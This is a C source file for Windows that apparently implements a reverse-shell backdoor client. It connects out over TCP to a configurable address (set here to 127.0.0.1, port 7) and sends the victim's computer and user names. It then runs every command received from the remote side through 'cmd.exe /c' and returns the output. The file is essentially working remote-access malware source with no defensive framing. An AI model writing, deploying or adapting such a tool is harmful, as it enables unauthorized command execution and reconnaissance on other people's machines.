#define _CRT_SECURE_NO_WARNINGS
#define	BUF_SZIE	1024*1024
#define	BUF_SZIES	1024
#define fileName	"output.txt"
#define IP			"127.0.0.1"
#define PORT		7

#include "winsock.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tchar.h>
#include <process.h>

#pragma comment(lib, "ws2_32.lib")

TCHAR  pcNameBuf[BUF_SZIES];
TCHAR  userNameBuf[BUF_SZIES];
DWORD  bufCharCount = BUF_SZIES;

WSADATA			wsd;
SOCKET			sHost;
SOCKADDR_IN		servAddr;
char			buf1[BUF_SZIE];
char			command[BUF_SZIE];
int				retVal;

void _recv(void* param) {
	int i;
	const char* p = (const char*)param;
	printf("Start to receive\n");

	while (1)
	{
		//send(sHost, "> ", 2, 0);

		ZeroMemory(command, BUF_SZIE);
		retVal = recv(sHost, command, BUF_SZIE, 0);
		//command[retVal] = '\0';

		if (SOCKET_ERROR == retVal)
		{
			printf("recv failed!\n");
			closesocket(sHost);
			WSACleanup();
			break;
		}

		SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
		HANDLE hRead, hWrite;
		if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
			send(sHost, "Error creating pipe.\n", 21, 0);
			continue;
		}

		STARTUPINFO si;
		PROCESS_INFORMATION pi;

		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		si.dwFlags = STARTF_USESTDHANDLES;
		si.hStdInput = hRead;
		si.hStdOutput = hWrite;
		si.hStdError = hWrite;

		ZeroMemory(&pi, sizeof(pi));

		wchar_t wcsCommandLine[BUF_SZIES] = L"cmd.exe /c ";
		mbstowcs(wcsCommandLine + 11, command, strlen(command) + 1);

		printf("Command: %s\n", command);
		if (!CreateProcess(NULL, wcsCommandLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
			send(sHost, "Error creating process.\n", 24, 0);
			continue;
		}

		CloseHandle(hWrite);


		char output[1024];
		DWORD bytesRead;
		while (ReadFile(hRead, output, sizeof(output), &bytesRead, NULL) && bytesRead != 0) {
			send(sHost, output, bytesRead, 0);
		}

		CloseHandle(hRead);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
	printf("%s has finished.\n", p);
}

void TcharToChar(const TCHAR* tchar, char* _char)
{
	int iLength;

	iLength = WideCharToMultiByte(CP_ACP, 0, tchar, -1, NULL, 0, NULL, NULL);

	WideCharToMultiByte(CP_ACP, 0, tchar, -1, _char, iLength, NULL, NULL);
}

int main(int argc, char* argv[])
{
	Sleep(1000);
	while (1) {
		if (WSAStartup(MAKEWORD(2, 2), &wsd) != 0)
		{
			printf("WSAStartup failed!\n");
			return -1;
		}

		sHost = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (INVALID_SOCKET == sHost)
		{
			printf("socket failed!\n");
			WSACleanup();
			return  -1;
		}

		servAddr.sin_family = AF_INET;
		servAddr.sin_addr.s_addr = inet_addr(IP);
		servAddr.sin_port = htons((short)PORT);
		int	nServAddlen = sizeof(servAddr);

		retVal = connect(sHost, (LPSOCKADDR)&servAddr, sizeof(servAddr));
		if (SOCKET_ERROR == retVal)
		{
			printf("connect failed!\n");
			closesocket(sHost);
			WSACleanup();
			return -1;
		}

		char pcName[BUF_SZIES], userName[BUF_SZIES];
		// Get and display the name of the computer.
		GetComputerName(pcNameBuf, &bufCharCount);
		TcharToChar(pcNameBuf, pcName);
		printf("Computer name:      %s\n", pcName);

		// Get and display the user name.
		GetUserName(userNameBuf, &bufCharCount);
		TcharToChar(userNameBuf, userName);
		printf("Computer name:      %s\n", userName);

		strcat(buf1, "Computer name:      ");
		strcat(buf1, pcName);
		strcat(buf1, "\n");
		send(sHost, buf1, strlen(buf1), 0);

		ZeroMemory(buf1, BUF_SZIE);

		strcat(buf1, "User name:          ");
		strcat(buf1, userName);
		strcat(buf1, "\n");
		send(sHost, buf1, strlen(buf1), 0);
		

		_beginthread(_recv, 0, "recv");

		while (1) {
			ZeroMemory(buf1, BUF_SZIE);
			fgets(buf1, BUF_SZIE, stdin);
			buf1[strlen(buf1) - 1] = '\0';
			if (strlen(buf1) < 1)	break;

			retVal = send(sHost, buf1, strlen(buf1), 0);
			if (SOCKET_ERROR == retVal)
			{
				printf("send failed!\n");
				closesocket(sHost);
				WSACleanup();
				return -1;
			}
		}

		closesocket(sHost);
		WSACleanup();
		printf("Client disconnected\n");
		system("pause");
	}

	return 0;
}